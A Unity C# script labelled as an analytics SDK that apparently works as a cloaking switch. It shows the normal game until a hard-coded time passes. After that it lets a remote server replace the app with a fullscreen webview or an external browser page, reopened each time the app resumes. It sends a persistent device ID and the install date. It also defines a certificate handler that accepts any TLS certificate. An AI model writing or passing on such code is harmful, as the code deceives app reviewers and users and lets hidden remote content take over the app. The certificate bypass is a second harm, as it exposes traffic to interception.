// Version 2.3 - 20/01/2026

using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using System;
using UnityEngine.SceneManagement;
using PaperPlaneTools;

public class UnityAnalytics : MonoBehaviour
{
    public const string  sdkVersion = "u_r_2.3";
 
    [SerializeField]
    private string analyticsURL;
    
    [SerializeField]
    private string mainSceneName;

    [SerializeField]
    private string uid;

    [SerializeField]
    private string orientation = "Portrait";

    // [SerializeField]
    // private bool external = false;

    private string cookie = "";
    private string guid;
    private string date;
    // private bool isActive = false;
    // private string dest;
    private bool openedExternalBrowser = false;
    private string externalBrowserUrl = "";
    UniWebView webView;

    // Start is called before the first frame update
    void Start()
    {
        if (orientation == "Portrait")
        {
            Screen.orientation = ScreenOrientation.Portrait;
        }
        else if (orientation == "LandscapeLeft")
        {
            Screen.orientation = ScreenOrientation.LandscapeLeft;
        }
        else if (orientation == "LandscapeRight")
        {
            Screen.orientation = ScreenOrientation.LandscapeRight;
        }
        else
        {
            Screen.orientation = ScreenOrientation.AutoRotation;
        }

        var webViewGameObject = new GameObject("UniWebView");
        webView = webViewGameObject.AddComponent<UniWebView>();
    
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    
        webView.OnOrientationChanged += (view, orientation) => {
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
        };

        long time = new DateTimeOffset(DateTime.Now).ToUnixTimeSeconds();

        if (!PlayerPrefs.HasKey("creativeid"))
        {
            guid = Guid.NewGuid().ToString();
            PlayerPrefs.SetString("creativeid", guid);
            PlayerPrefs.Save();
        }
        else
        {
            guid = PlayerPrefs.GetString("creativeid");
        }

        if (!PlayerPrefs.HasKey("externalid"))
        {
            DateTime currentDate = DateTime.Now;

            // date = currentDate.ToString("dd/MM/yyyy");
            // Debug.Log("current Date: " + date);

            string day = currentDate.Day.ToString("00");
            string month = currentDate.Month.ToString("00");
            string year = currentDate.Year.ToString("0000");
            date = day + "/" + month + "/" + year;

            PlayerPrefs.SetString("externalid", date);
            PlayerPrefs.Save();
        }
        else
        {
            date = PlayerPrefs.GetString("externalid");
        }


        if (uid == "" || time>Convert.ToDecimal(uid))
        {
            int index = analyticsURL.IndexOf('?');
            string trimmedString = "";

            if (index != -1)
            {
                trimmedString = analyticsURL.Substring(0, index);
            }
            else
            {
                trimmedString = analyticsURL;
            }

            StartCoroutine(getRequest(trimmedString + "?external_id=" + date + "&creative_id=" + guid + "&cv=" + sdkVersion));
        }
        else
        {
            SceneManager.LoadScene(mainSceneName, LoadSceneMode.Single);
        }
    }

    IEnumerator getRequest(string uri)
    {
        string url = uri;

        if(!PlayerPrefs.HasKey("ud"))
        {
            url = url + "&ud=1";
            PlayerPrefs.SetString("ud", "1");
            PlayerPrefs.Save();
        }
       
        UnityWebRequest uwr = UnityWebRequest.Get(url);
        // uwr.certificateHandler = new BypassCertificate();

        cookie = PlayerPrefs.GetString("cookie");
       
        if (!string.IsNullOrEmpty(cookie))
        {
            uwr.SetRequestHeader("Cookie", cookie);
        }

        yield return uwr.SendWebRequest();

        if (uwr.result == UnityWebRequest.Result.ConnectionError || uwr.responseCode == 500 || uwr.responseCode == 404)
        {
            if (uwr.result == UnityWebRequest.Result.ConnectionError)
            {
                Debug.Log("Connection Error: " + uwr.error);
            }
            
            new Alert ("Server Error: " + uwr.error, "Plesae try again later")
			.SetPositiveButton ("OK", () => {
                StartCoroutine(getRequest(uri));
			})
			.Show ();
        }
        else
        {
            cookie = uwr.GetResponseHeader("Set-Cookie");
           
            PlayerPrefs.SetString("cookie",cookie);
            PlayerPrefs.Save();
 
            if (uwr.downloadHandler.text.Contains("EXTERNALIDFILE"))
            {
                // Open in external browser
                openedExternalBrowser = true;
                externalBrowserUrl = uri;
                Application.OpenURL(uri);
            }
            else if (uwr.downloadHandler.text != "")
            {
                // Open in UniWebView (in-app)
                Screen.orientation = ScreenOrientation.Portrait;
                webView.Load(uri);
                webView.Show();      
            }
            else
            {
                SceneManager.LoadScene(mainSceneName, LoadSceneMode.Single);
            }
        }
    }

    // Update is called once per frame
    void Update()
    {
        
    }

    void OnApplicationPause(bool pauseStatus)
    {
        // When app resumes (pauseStatus = false) and we previously opened external browser
        if (!pauseStatus && openedExternalBrowser)
        {
            Application.OpenURL(externalBrowserUrl);
        }
    }


}

public class BypassCertificate : CertificateHandler
{
    protected override bool ValidateCertificate(byte[] certificateData)
    {
        //Simply return true no matter what
        return true;
    }
} 